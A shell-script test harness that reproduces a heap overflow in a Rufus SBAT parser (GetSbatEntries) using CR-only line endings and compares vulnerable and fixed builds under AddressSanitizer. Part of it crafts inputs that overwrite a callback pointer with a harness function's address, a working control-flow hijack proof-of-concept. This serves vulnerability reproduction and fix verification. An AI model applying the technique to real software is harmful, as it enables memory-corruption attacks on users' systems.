#!/bin/sh
# Replay the pinned Rufus GetSbatEntries CR-line-ending overflow. File/API only;
# no network target, Windows process, shell or command is contacted.
set -eu
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
cd "$ROOT"
mkdir -p evidence
sha256sum -c SHA256SUMS
./harness/build.sh

fails=0
check() {
  name=$1; shift
  if "$@"; then echo "PASS $name"; else echo "FAIL $name"; fails=$((fails+1)); fi
}

run() {
  out=$1; bin=$2; shift 2
  set +e
  ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 "$bin" "$@" > "evidence/$out.out" 2>&1
  echo $? > "evidence/$out.rc"
  set -e
}

make_lines() {
  path=$1; count=$2; ending=$3; version=${4:-1}
  : > "$path"
  i=0
  while [ "$i" -lt "$count" ]; do
    printf 'p%d,%s%b' "$i" "$version" "$ending" >> "$path"
    i=$((i + 1))
  done
}

make_lines evidence/lf3.txt 3 '\n'
make_lines evidence/crlf3.txt 3 '\r\n'
make_lines evidence/cr60.txt 60 '\r'
make_lines evidence/cr2.txt 2 '\r'
make_lines evidence/cr3-zero.txt 3 '\r' 0x0

run vuln-asan-lf3 harness/bin/vuln-asan evidence/lf3.txt iterate
check vuln-asan-lf3 sh -c "test \"\$(cat evidence/vuln-asan-lf3.rc)\" = 0 && grep -q '^ENTRIES=3$' evidence/vuln-asan-lf3.out"

run vuln-asan-crlf3 harness/bin/vuln-asan evidence/crlf3.txt iterate
check vuln-asan-crlf3 sh -c "test \"\$(cat evidence/vuln-asan-crlf3.rc)\" = 0 && grep -q '^ENTRIES=3$' evidence/vuln-asan-crlf3.out"

run vuln-asan-cr60 harness/bin/vuln-asan evidence/cr60.txt iterate
check vuln-asan-cr60 sh -c "test \"\$(cat evidence/vuln-asan-cr60.rc)\" != 0 && grep -q 'heap-buffer-overflow' evidence/vuln-asan-cr60.out && grep -q 'WRITE of size 8' evidence/vuln-asan-cr60.out && grep -q '0 bytes after 32-byte region' evidence/vuln-asan-cr60.out && grep -q 'parser.c:1651' evidence/vuln-asan-cr60.out"

run fixed-asan-cr60 harness/bin/fixed-asan evidence/cr60.txt iterate
check fixed-asan-cr60 sh -c "test \"\$(cat evidence/fixed-asan-cr60.rc)\" = 0 && grep -q '^ENTRIES=60$' evidence/fixed-asan-cr60.out"

run vuln-asan-cr2-read harness/bin/vuln-asan evidence/cr2.txt iterate
check vuln-asan-cr2-read sh -c "test \"\$(cat evidence/vuln-asan-cr2-read.rc)\" != 0 && grep -q 'heap-buffer-overflow' evidence/vuln-asan-cr2-read.out && grep -q 'READ of size 8' evidence/vuln-asan-cr2-read.out && grep -q '0 bytes after 32-byte region' evidence/vuln-asan-cr2-read.out"

run fixed-asan-cr2 harness/bin/fixed-asan evidence/cr2.txt iterate
check fixed-asan-cr2 sh -c "test \"\$(cat evidence/fixed-asan-cr2.rc)\" = 0 && grep -q '^ENTRIES=2$' evidence/fixed-asan-cr2.out"

marker=$(nm harness/bin/vuln-marker | awk '$3 == "benign_marker" {print $1}')
notcalled=$(nm harness/bin/vuln-marker | awk '$3 == "not_called" {print $1}')
test -n "$marker"
test -n "$notcalled"
make_lines evidence/cr3-marker.txt 3 '\r' "0x$marker"
make_lines evidence/cr3-notcalled.txt 3 '\r' "0x$notcalled"
wrong=$(printf '%x' "$((0x$marker + 1))")
make_lines evidence/cr3-wrong.txt 3 '\r' "0x$wrong"

run vuln-marker-attack harness/bin/vuln-marker evidence/cr3-marker.txt marker
check vuln-marker-attack sh -c "test \"\$(cat evidence/vuln-marker-attack.rc)\" = 0 && grep -qx 'PREFIX_IN_INPUT=1 CALLBACK=benign_marker GUARD=1122334455667788' evidence/vuln-marker-attack.out && grep -qx 'BENIGN_MARKER' evidence/vuln-marker-attack.out"

run fixed-marker-attack harness/bin/fixed-marker evidence/cr3-marker.txt marker
check fixed-marker-attack sh -c "test \"\$(cat evidence/fixed-marker-attack.rc)\" = 0 && grep -qx 'PREFIX_IN_INPUT=0 CALLBACK=not_called GUARD=1122334455667788' evidence/fixed-marker-attack.out && grep -qx 'NOT_CALLED' evidence/fixed-marker-attack.out"

run vuln-marker-notcalled harness/bin/vuln-marker evidence/cr3-notcalled.txt marker
check vuln-marker-notcalled sh -c "test \"\$(cat evidence/vuln-marker-notcalled.rc)\" = 0 && grep -qx 'PREFIX_IN_INPUT=1 CALLBACK=not_called GUARD=1122334455667788' evidence/vuln-marker-notcalled.out && grep -qx 'NOT_CALLED' evidence/vuln-marker-notcalled.out"

run vuln-marker-wrong harness/bin/vuln-marker evidence/cr3-wrong.txt marker
check vuln-marker-wrong-negative sh -c "test \"\$(cat evidence/vuln-marker-wrong.rc)\" != 0 && grep -qx 'PREFIX_IN_INPUT=1 CALLBACK=unexpected GUARD=1122334455667788' evidence/vuln-marker-wrong.out && ! grep -qx 'BENIGN_MARKER' evidence/vuln-marker-wrong.out"

run vuln-marker-cr2 harness/bin/vuln-marker evidence/cr2.txt marker
check vuln-marker-cr2 sh -c "test \"\$(cat evidence/vuln-marker-cr2.rc)\" = 0 && grep -qx 'PREFIX_IN_INPUT=0 CALLBACK=not_called GUARD=1122334455667788' evidence/vuln-marker-cr2.out && grep -qx 'NOT_CALLED' evidence/vuln-marker-cr2.out"

if [ "$fails" -ne 0 ]; then
  echo RUN_ALL_FAIL "$fails" | tee evidence/last-run.out
  exit 1
fi
if sha256sum -c SHA256SUMS; then
  echo RUN_ALL_OK 11 PASS / 0 FAIL | tee evidence/last-run.out
else
  echo RUN_ALL_FAIL stable-evidence-pins | tee evidence/last-run.out
  exit 1
fi
